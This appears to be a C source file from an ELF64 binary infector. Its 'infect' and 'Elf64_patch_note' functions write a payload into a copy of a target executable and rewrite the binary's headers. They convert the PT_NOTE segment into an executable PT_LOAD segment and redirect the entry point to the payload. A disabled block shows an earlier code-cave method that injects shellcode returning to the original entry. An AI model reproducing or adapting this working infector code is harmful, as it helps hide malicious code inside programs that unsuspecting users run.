
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "elf64_patch.h"
#include "elf64_payload.h"
#include "types.h"
#include "retcodes.h"
#include "elf64_shr.h"
#include "elf64_phr.h"

#define ALIGN_UP(n) (((n) + 15) & ~15)

#if 0
void Elf64_insert_code(ELF *bin, char *code, Elf64_Off offset, Elf64_Half code_size) {
	FILE *target = fopen("patched", "w");
	unsigned char byte;
	fseek(bin->file, 0L, SEEK_SET);
	size_t i;
	for (i = 0; i < offset; i++) {
		fread(&byte, 1, 1, bin->file);
		fwrite(&byte, 1, 1, target);
	}
	for (i = 0; i < code_size; i++) {
		fwrite(code + i, 1, 1, target);
	}
	while (fread(&byte, 1, 1, bin->file) == 1)
		fwrite(&byte, 1, 1, target);
	/* Modify entry point */
	Elf64_write_ehr(target, bin->ehr);
	/* Modify section size */
	Elf64_write_shr_all(target, bin->shr, bin->ehr->e_shnum, bin->ehr->e_shoff, bin->ehr->e_shentsize);
	Elf64_write_phr_all(target, bin->phr, bin->ehr->e_phnum, bin->ehr->e_phoff, bin->ehr->e_phentsize);
	fclose(target);
	return;
}


#define ALIGN 1

void Elf64_target(ELF *bin) {
	size_t i;
	Elf64_Addr old_entry = bin->ehr->e_entry;
	Elf64_Addr delta;
	Elf64_Shdr *shr;
	Elf64_Phdr *phr;
	Elf64_Phdr *code_segment;
	Elf64_Phdr *data_segment = NULL;
	/* Where to insert code ? */
	for (i = 0; i < bin->ehr->e_phnum; i++) {
		phr = bin->phr[i];
		if ((phr->p_flags & 0x04) != 0 && (phr->p_flags & 0x01) != 0)
			code_segment = phr;
	}
	for (i = 0; i < bin->ehr->e_phnum; i++) {
		phr = bin->phr[i];
		if ((phr->p_offset >= code_segment->p_offset + code_segment->p_filesz) && ((data_segment == NULL) || (phr->p_offset < data_segment->p_offset ))) 
			data_segment = phr;
	}
	printf("Code segment: starts at 0x%08x | Size: 0x%06x\n", (Elf64_Word) code_segment->p_vaddr, (Elf64_Half) code_segment->p_filesz);
	printf("Data segment: starts at 0x%08x | Size: 0x%06x\n", (Elf64_Word) data_segment->p_vaddr, (Elf64_Half) data_segment->p_filesz);
	Elf64_Off code_offset = code_segment->p_filesz + code_segment->p_offset;
#if ALIGN
	Elf64_Off code_vaddr = ALIGN_UP(code_segment->p_filesz + code_segment->p_vaddr);
	Elf64_Off gap = code_vaddr - (code_segment->p_filesz + code_segment->p_vaddr);
#else
	Elf64_Off code_vaddr = code_segment->p_filesz + code_segment->p_vaddr;
#endif
	bin->ehr->e_entry = code_vaddr;

#if 0
	/* Read code to insert */
	FILE *code_file = fopen("bin_test/shellcode", "r");
	fseek(code_file, 0L, SEEK_END);
	Elf64_Half code_size = ftell(code_file);
	fseek(code_file, 0L, SEEK_SET);
	printf("DEBUG: code size %x\n", code_size);

	/* Allocate buffer to store code */
	char *code = malloc((code_size + 1) * sizeof(char));
	/* Get code */
	fread(code, 1, code_size, code_file);
	code[code_size] = '\0';
#else 
	Elf64_Half code_size = 6 + gap;
	char *code = malloc((code_size) * sizeof(char));
	for (i = 0; i < gap; i++) {
		code[i] = 0x00;
	}
	code[gap + 0] = 0x68;
	code[gap + 1] = (unsigned char) (old_entry & 0xFF);
	code[gap + 2] = (unsigned char) ((old_entry >> 8) & 0xFF);
	code[gap + 3] = (unsigned char) ((old_entry >> 16) & 0xFF);
	code[gap + 4] = (unsigned char) ((old_entry >> 24) & 0xFF);
#if 0
	code[gap + 5] = (unsigned char) ((old_entry >> 32) & 0xFF);
	code[gap + 6] = (unsigned char) ((old_entry >> 40) & 0xFF);
	code[gap + 7] = (unsigned char) ((old_entry >> 48) & 0xFF);
	code[gap + 8] = (unsigned char) ((old_entry >> 56) & 0xFF);
#endif
	code[gap + 5] = 0xC3;
#endif	
	/* And so modify offset for each following section */
	for (i = 0; i < bin->ehr->e_shnum; i++) {
		shr = bin->shr[i];
		if (shr->sh_offset >= code_offset) {
			shr->sh_offset += code_size;
			shr->sh_addr += code_size;
		} else if (shr->sh_offset + shr->sh_size >= code_offset) {
			/* Modify section size */
			shr->sh_size += code_size; 
		}
	}
	
	code_segment->p_filesz += code_size;
	code_segment->p_memsz += code_size;
	for (i = 0; i < bin->ehr->e_phnum; i++) {
		phr = bin->phr[i];
		if (phr->p_offset >= code_segment->p_offset + code_segment->p_filesz) { 
			phr->p_offset += code_size;
			phr->p_paddr += code_size;
			phr->p_vaddr += code_size;
		}
	}

	/* Insert code */
	Elf64_insert_code(bin, code, code_offset, code_size);
	return;
}


#endif


void infect(ELF *bin, unsigned char *payload, Elf64_Off offset, Elf64_Half pl_size, 
					Elf64_Off nxtp_off) {
	FILE *target = fopen("patched", "w");
	size_t i;
	unsigned char byte;
	fseek(bin->file, 0L, SEEK_SET);
	for (i = 0; i < offset; i++) {
		fread(&byte, 1, 1, bin->file);
		fwrite(&byte, 1, 1, target);
	}
	for (i = 0; i < pl_size; i++) {
		fwrite(payload + i, 1, 1, target);
	}
	fseek(bin->file, nxtp_off, SEEK_SET);
	while (fread(&byte, 1, 1, bin->file) == 1)
		fwrite(&byte, 1, 1, target);
	/* Modify entry point */
	Elf64_write_ehr(target, bin->ehr);
	/* Modify section size */
	Elf64_write_shr_all(target, bin->shr, bin->ehr->e_shnum, bin->ehr->e_shoff, bin->ehr->e_shentsize);
	Elf64_write_phr_all(target, bin->phr, bin->ehr->e_phnum, bin->ehr->e_phoff, bin->ehr->e_phentsize);
	fclose(target);
	return;
}

void Elf64_patch_note(ELF *bin, unsigned char *pl, Elf64_Half *pl_size) {
	// TODO if no pnote (ie NULL)
	Elf64_Phdr *pnote = Elf64_get_pnote(bin);
	if (*pl_size > pnote->p_filesz) {
		printf("ERROR: payload is too large to fit in Note section \
		(not implemented yet)\n");
		exit(EXIT_NOT_IMPLEMENTED);
	}
	pl = pad_payload(pl, pl_size, pnote->p_filesz, 0x00);
	// TODO if no pcode (ie NULL)
	Elf64_Phdr *pcode = Elf64_get_pcode(bin);
	pnote->p_type = PT_LOAD;
	pnote->p_flags = pcode->p_flags;
	bin->ehr->e_entry = pnote->p_vaddr;
	infect(bin, pl, pnote->p_offset, *pl_size, pnote->p_offset + pnote->p_filesz);
	return;
}
